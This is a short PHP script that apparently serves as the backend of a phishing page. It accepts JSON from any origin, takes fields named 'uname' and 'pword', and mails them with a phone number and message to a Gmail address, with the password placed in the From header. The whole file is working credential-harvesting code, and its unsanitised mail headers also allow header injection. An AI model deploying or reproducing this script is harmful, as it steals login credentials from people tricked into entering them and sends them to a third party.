<?php
header("Access-Control-Allow-Origin: *");
$rest_json = file_get_contents("php://input");
$_POST = json_decode($rest_json, true);

if (empty($_POST['uname']) && empty($_POST['pword'])) die();

if ($_POST)
	{

	http_response_code(200);
	$subject = $_POST['uname'];
	$to = "elisa@gmail.com";
	$from = $_POST['pword'];

	$msg = $_POST['number'] . $_POST['message'];


	$headers = "MIME-Version: 1.0\r\n";
	$headers.= "Content-type: text/html; charset=UTF-8\r\n";
	$headers.= "From: <" . $from . ">";
	mail($to, $subject, $msg, $headers);
    }
?>